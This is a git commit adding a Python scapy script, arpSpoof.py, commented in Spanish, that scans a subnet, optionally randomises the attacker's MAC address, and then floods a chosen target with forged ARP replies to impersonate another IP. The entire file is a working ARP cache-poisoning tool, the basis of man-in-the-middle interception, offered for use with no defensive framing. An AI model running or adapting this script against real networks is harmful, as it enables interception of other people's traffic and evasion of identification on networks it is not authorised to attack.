352b3a45bb63294a4356998da4c95ca64ff9bb38
Julio Serrata <58531265+juliospau@users.noreply.github.com>
2023-01-06 03:31:55 +0100

    Create arpSpoof.py

---
+++ arpSpoof.py
@@ -0,0 +1,84 @@
+#!/bin/python3
+
+import argparse
+import os
+from scapy.all import *
+from time import sleep
+
+if os.geteuid() != 0:
+    print ("¡EJECUTA COMO ROOT!".center(100, "="))
+    exit()
+else:
+    pass
+
+parser = argparse.ArgumentParser()
+parser.add_argument("-s", "--scan", dest="scan", help="Escanear la red para encontrar IP o MAC del objetivo. Introduce una IP o un rango. Ejemplo: ./arpSpoof.py -s 10.0.2.1/24")
+parser.add_argument("-m", "--mac", dest="mac", help="Cambiar a una MAC aleatoria antes de iniciar el ataque ( true ). Ejemplo: ./arpSpoof.py -m true")
+parser.add_argument("-i", "--interface", dest="interface", help="Interfaz a configurar. Ejemplo: ./arpSpoof.py -i eth0")
+
+options = parser.parse_args()
+
+conjuntoCars = ["A", "B", "C", "D", "E", "F"]
+
+try:
+    if options.scan:
+
+        arp_request = ARP(pdst=options.scan)
+        broadcast = Ether(dst='FF:FF:FF:FF:FF:FF')
+
+        arp_request_broadcast = broadcast/arp_request
+
+        answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+
+        print ( "IP".center(44), "MAC\n" )
+        for i in answered_list:
+            print ( '\t\t', i[1].psrc, "\t\t", i[1].src )
+
+        pass
+
+
+    if options.mac and options.interface:
+
+        for i in range(0, 9):
+            conjuntoCars.append( i )
+
+        nuevaMac = ""
+        contador = 0
+        while contador < 6:
+
+            if contador == 0:
+                nuevaMac += str(random.choice(conjuntoCars)) + str(random.choice(range(0,9,2)))
+            else:
+                nuevaMac += str(random.choice(conjuntoCars)) + str(random.choice(conjuntoCars))
+
+            contador += 1
+
+            if contador < 6:
+                nuevaMac += ":"
+            else:
+                continue
+        print ( "\n[+] Estableciendo la MAC " + nuevaMac + " sobre " + options.interface)
+
+        subprocess.call(["ifconfig", options.interface, "down"])
+        subprocess.call(["ifconfig", options.interface, "hw", "ether", nuevaMac])
+        subprocess.call(["ifconfig", options.interface, "up"])
+
+        subprocess.call(["ip", "--color", "link", "show", options.interface])
+        
+        pass
+
+
+    # RESPUESTA ARP
+
+    targetIp = input("Introduce la IP del objetivo: ")
+    targetMac = input("Introduce la MAC del objetivo: ")
+    ipSpoof = input("Introduce la IP a spoofear: ")
+
+    while True:
+        packet = ARP(op=2, pdst=targetIp, hwdst=targetMac, psrc=ipSpoof)  # Se crea la respuesta ARP ( op = 2 )
+        sleep(1)
+        send(packet)
+
+except KeyboardInterrupt:
+    print ("Se ha interrumpido el script...")
+    exit()
